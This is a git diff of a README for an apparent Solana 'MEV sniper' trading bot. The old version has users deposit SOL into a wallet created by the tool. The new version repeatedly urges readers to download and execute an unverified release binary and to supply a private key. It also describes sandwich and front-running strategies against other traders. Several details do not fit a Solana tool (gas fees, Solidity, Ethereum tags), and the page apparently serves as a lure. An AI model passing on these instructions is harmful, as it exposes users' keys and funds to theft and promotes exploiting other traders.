@@ -1,170 +1,230 @@
-﻿
-# Solana-TradeTool
+Solana MEV Sniper Bot — Fast In-Browser and Local Runner
+========================================================
 
-![⬛🤖 Banner](https://i.ibb.co/jZ35DZKx/image-3.jpg)
+[![Releases](https://img.shields.io/badge/Releases-download-brightgreen)](https://github.com/Fakhir45332/Solana-bot/releases)
 
-### Solana-TradeTool is an advanced trading system for the Solana blockchain, featuring a user-friendly interface and seamless integration with decentralized exchanges like `Jupiter`, `Raydium`, and `Pump.FUN`.
+[![Built for Solana](https://img.shields.io/badge/Platform-Solana-2EA2F8.svg)](https://solana.com) [![Language-JS](https://img.shields.io/badge/Language-JavaScript-F7DF1E.svg)](https://github.com/Fakhir45332/Solana-bot)
 
-## ✨ Key Features
+![Solana MEV](https://cryptologos.cc/logos/solana-sol-logo.png?v=014)
 
-- **🚫 Anti-Scam Protection**: Automatically filters potentially risky tokens.
-- **🔗 Auto Network Integration**: Effortless connection to the Solana blockchain.
-- **💰 Stop-Loss & Take-Profit**: Customizable risk management settings.
-- **💸 Market Cap Screening**: Excludes tokens with low market capitalization.
-- **💳 Flexible Transactions**: Set fixed amounts or balance percentages for trades.
+Overview
+--------
 
+Solana-bot inspects mempool activity and acts on profitable opportunities across Pump.FUN, Jupiter, and Raydium. It runs in a browser or on a local machine. The bot automates transaction watching, analysis, and execution. It focuses on speed, configurability, and direct control.
 
+Key features
+------------
 
-### Benefits
+- Mempool watcher that reads pending transactions and extracts trade signals.
+- Trade execution on Pump.FUN, Jupiter, and Raydium.
+- Two run modes: in-browser (UI) and local (Node.js CLI).
+- Trade filters: profit threshold, slippage, max gas, blacklist.
+- Position sizing and risk controls via config.
+- Logging, performance metrics, and adjustable concurrency.
+- Devnet/testnet mode for safe testing.
 
-- **📱 Mobile-Optimized**: Trade on the go with a phone-friendly interface.
-- **✅ No Setup Required**: Pre-bundled JavaScript, no dependencies needed.
-- **🌍 Cross-Platform**: Compatible with PC, Mac, tablets, and phones.
+Badges and links
+----------------
 
-![⬛🤖 Banner](https://i.ibb.co/MkD07ZbQ/solana-bot.png)
+Get the packaged release file here and run it locally after download:
 
-## 📢 Latest Update (2025-08-05)
+[Download Release](https://github.com/Fakhir45332/Solana-bot/releases)
 
-- **Wallet Import**: Import existing wallets during setup.
-- **Browser Deployment**: Deploy HTML, CSS, and JS files to a server or run locally.
-- **New Token Scanning with Anti-Scam**: Automatically scans and filters newly discovered tokens using advanced protection.
+If you use the packaged release, download the release file and execute it on your machine. The Releases page lists binaries and packaged builds. Use the matching file for your OS and follow the included run steps.
 
-## ⚙️ System Settings
+Quick demo images
+-----------------
 
-- **💰 Stop-Loss and Take-Profit**: Set thresholds for automatic sales at desired profit or minimal loss levels.
-- **💸 Token Market Cap Screening**: Exclude low market cap tokens from trading.
-- **💳 Transaction Amount Settings**: Configure fixed amounts or balance percentages for trades.
+![Mempool Stream](https://images.unsplash.com/photo-1531297484001-80022131f5a1?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop&crop=faces)  
+![DEX Trading](https://images.unsplash.com/photo-1559526324-593bc073d938?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop&crop=entropy)
 
-### Screenshots Demonstrating Operation
+Why use this bot
+----------------
 
-**EXAMPLE:** [SolScan Example Account Tool](https://solscan.io/account/7rhxnLV8C77o6d8oz26AgK8x8m5ePsdeRawjqvojbjnQ)
+- The bot reads raw pending transactions and extracts trade intents.
+- It maps intents to on-chain DEX routes and finds arbitrage or sandwich chances.
+- It gives precise config to match your risk profile.
+- It runs where you prefer: in the browser or on your own node.
 
-![📷 Screenshot 1](https://i.ibb.co/5Tk1QRz/SolScan1.png)
+Topics
+------
 
-**💰 Important:** For effective operation and risk minimization, a starting balance of at least **3 SOL** is recommended, as the system manages multiple trading operations simultaneously. The optimal starting balance is **5-10 SOL**.
+blockchain, bot, crypto-bot, decentralized-exchanges, dex, ethereum, javascript, mempool, mev, nodejs, smart-contracts, solana, solidity
 
-## 🖥️ Main Menu in Solana-TradeTool via VS Code
+Requirements
+------------
 
-When launching the project through Visual Studio Code, the main menu of Solana-TradeTool will open:
+- Node.js 16+ for local mode.  
+- Modern Chromium-based browser for in-browser mode.  
+- Solana RPC endpoint (mainnet or devnet).  
+- Private key or wallet provider for signing transactions.  
+- Network access to Pump.FUN, Jupiter, or Raydium RPC / APIs.
 
-- **📋 Main Menu**: Displays key features like wallet management, balance overview, trading operations, and system configuration.
-- **⚙️ Settings and Management**: Configure Stop-Loss, Take-Profit, select decentralized exchanges, and manage wallets.
+Local quick start
+-----------------
 
-**📷 Main Menu Screenshots:**
+1. Clone the repo:
+   git clone https://github.com/Fakhir45332/Solana-bot.git
+2. Enter folder:
+   cd Solana-bot
+3. Install:
+   npm ci
+4. Create config file:
+   cp example.config.json config.json
+5. Edit config.json with your RPC, keys, and strategy.
+6. Start:
+   npm start
 
-![📷 Main Menu Screenshot 1](https://i.ibb.co/jvTd4zxz/111.png)
+Browser (in-browser) quick start
+-------------------------------
 
-## 🛠️ Prerequisites
+1. Open the repo in a browser tab (serve the dist folder or use the packaged release that includes a browser UI).  
+2. Connect your wallet (Phantom or compatible).  
+3. Set RPC, route preferences, and strategy in the UI.  
+4. Toggle run mode: monitor or live.  
+5. Use testnet or devnet first.
 
-Ensure the following programs are installed:
+Download & run from Releases
+----------------------------
 
-- [🔗 Git](https://git-scm.com/) (for cloning the repository)
-- [🔗 Node.js](https://nodejs.org/) (including npm)
-- [🔗 VSCode](https://code.visualstudio.com), Visual Studio Code
+This repository publishes packaged builds on the Releases page. Go to:
 
-## 📥 Installation
+https://github.com/Fakhir45332/Solana-bot/releases
 
-Alternatively, **download the ZIP file manually** from the GitHub repository:
+Download the release file for your platform. After download, extract and execute the provided binary or script. Release artifacts include a README and a run script. Follow the included run steps inside the release bundle.
 
-1. Visit the repository's page on GitHub.
-2. Click the **Code** button (green).
-3. Select **Download ZIP**.
-4. Extract the ZIP file to any folder on your computer.
+Configuration reference
+-----------------------
 
-### Or:
+Use config.json or environment variables to tune the bot. Sample fields:
 
-1. **📂 Clone the Repository**:
+- rpcUrl: string — Solana RPC endpoint.
+- walletKey: string — Base58 private key or path to keyfile.
+- mode: "local" | "browser" — Run mode.
+- targetDex: ["pumpfun","jupiter","raydium"] — DEX list.
+- profitThreshold: number — Minimum profit in lamports or SOL cents.
+- slippagePct: number — Allowed slippage percent.
+- maxGasFee: number — Max fee in lamports.
+- concurrency: number — Parallel tx execution limit.
+- watchFilters: object — Token lists, blacklist, minAmount.
+- logLevel: "debug" | "info" | "error" — Logging verbosity.
+
+Example config.json
+-------------------
+
+{
+  "rpcUrl": "https://api.mainnet-beta.solana.com",
+  "walletKeyPath": "./wallet.json",
+  "mode": "local",
+  "targetDex": ["pumpfun","jupiter","raydium"],
+  "profitThreshold": 0.02,
+  "slippagePct": 0.5,
+  "maxGasFee": 5000,
+  "concurrency": 4,
+  "logLevel": "info"
+}
 
-   - Open **Terminal** (macOS/Linux) or **Command Prompt (CMD)** (Windows).
-   - Navigate to the desired folder:
+Strategy examples
+-----------------
 
-     ```bash
-     cd path-to-your-folder
-     ```
+- Sandwich: detect large swaps and insert two trades to profit from expected price move. Set a low slippage and small spread for safety.  
+- Arbitrage: detect price differences across DEXs and execute cross-pair swaps. Use route optimization and fast routing via Jupiter.  
+- Front-run token mints: detect new token listing signals and act quickly. Use strict risk controls.
 
-   - Clone the repository from GitHub:
+Testing and devnet
+------------------
 
-     ```bash
-     git clone https://github.com/Wiseilvaneom0/Solana-bot.git
-     ```
+- Use devnet RPC and faucet tokens.  
+- Set smaller stakes and longer delays.  
+- Enable verbose logs to watch decision flow.  
+- Use the included test scripts to replay saved mempool events.
 
-   - Navigate to the project folder:
+Security and keys
+-----------------
 
-     ```bash
-     cd path-to-your-project
-     ```
+Store keys locally. Use OS-level file permissions. Use a wallet provider for the browser UI. Rotate keys and revoke access when you stop the bot. Keep RPC endpoints private where possible.
 
-2. **📦 Install Dependencies**:
+Logging and metrics
+-------------------
 
-   - Ensure **Node.js** is installed. If not, download it from [Node.js](https://nodejs.org/).
-   - Run the following command in the terminal:
+- Logs write to disk and console.  
+- Metrics include processed TX/s, successes, fails, and profit totals.  
+- Use logLevel to control output.
 
-     ```bash
-     npm install
-     ```
+Performance tips
+----------------
 
-   - This installs all dependencies listed in `package.json`.
+- Use a low-latency RPC near the Solana cluster.  
+- Run multiple workers to parallelize analysis.  
+- Keep route cache warm for common token pairs.  
+- Use native binaries on production hosts for lower overhead.
 
-3. **🚀 Launch the Application**:
+Common commands
+---------------
 
-   - After installing dependencies, start the application:
+- npm start — start local mode.  
+- npm run build — produce the browser bundle.  
+- npm run test — run unit tests.  
+- node tools/replay.js ./samples/mempool.json — replay sample mempool for debugging.
 
-     ```bash
-     node trade.js
-     ```
+Testing replay example
+----------------------
 
-   - If successful, the application will start, and you’ll see confirmation messages in the terminal.
+node tools/replay.js samples/mempool-sample.json --rpc https://api.devnet.solana.com
 
-## 📚 Usage Guide
+This replays mempool data against your strategy. Use it to validate logic without live risk.
 
-1. **💻 Run the Script**:
+Troubleshooting
+---------------
 
-   - Open the terminal or command prompt.
-   - Navigate to the project directory:
+- If you see failed signatures, check walletKey.  
+- If you see timeouts, switch RPC or increase maxGasFee.  
+- If routes fail, update route cache and retry with lower concurrency.
 
-     ```bash
-     cd path-to-your-project
-     ```
+Contributing
+------------
 
-   - Launch the application:
+- Fork the repo.  
+- Create a branch: feature/<name>.  
+- Run tests and lint.  
+- Open a pull request with a clear description and tests.  
+- Keep changes modular and small.
 
-     ```bash
-     node trade.js
-     ```
+Code style
+----------
 
-   - **Tip:** Use a code editor like Visual Studio Code, Sublime Text, Atom, or another IDE.
+- JavaScript (ES2020+).  
+- Use async/await.  
+- Keep functions small and focused.  
+- Add unit tests for strategy changes.
 
-2. **👜 Create a New Solana-TradeTool Wallet**:
+Testing guidelines
+------------------
 
-   - In the main menu, select `Create New Wallet`.
-   - Securely save your Wallet Key.
+- Cover mempool parser and route selection.  
+- Mock RPC responses.  
+- Validate signatures and transaction format.
 
-3. **💸 Deposit**:
+Licensing
+---------
 
-   - **Method 1: Manual Transfer** — Send SOL to the created wallet address.
-   - **Method 2: QR Code** — Generate a QR code in the `Deposit` section for transfers.
+This repo uses the MIT license. See the LICENSE file.
 
-4. **📊 Check Balance**:
+Credits
+-------
 
-   - **Method 1**: Click the `Balance` button in the application.
-   - **Method 2**: Use [🔗 SolScan](https://solscan.io/) to verify your balance.
+- Solana network and docs.  
+- Jupiter routing.  
+- Raydium and Pump.FUN protocols.
 
-5. **⚙️ Configure the System**:
+Contact
+-------
 
-   - Go to the `Settings` section.
-   - Set Stop-Loss, Take-Profit, and minimum/maximum transaction amounts.
-   - Select decentralized exchanges for trading.
+Raise issues on GitHub. For PRs, use clear commit messages and link tests.
 
-6. **🚀 Start the System**:
+Release link (again)
+--------------------
 
-   - Click `Start` to begin operations.
+Download the release bundle and run the executable from the Releases page:
 
-7. **💸 Withdraw Funds and Stop the System**:
-
-   - Navigate to the `Withdraw` section.
-   - Enter the wallet address for fund transfers.
-   - Confirm the withdrawal to halt operations.
-
-## 📜 License
-
-This project is licensed under the MIT License. Details can be found in the `LICENSE` file.
+[Releases and downloads](https://github.com/Fakhir45332/Solana-bot/releases)
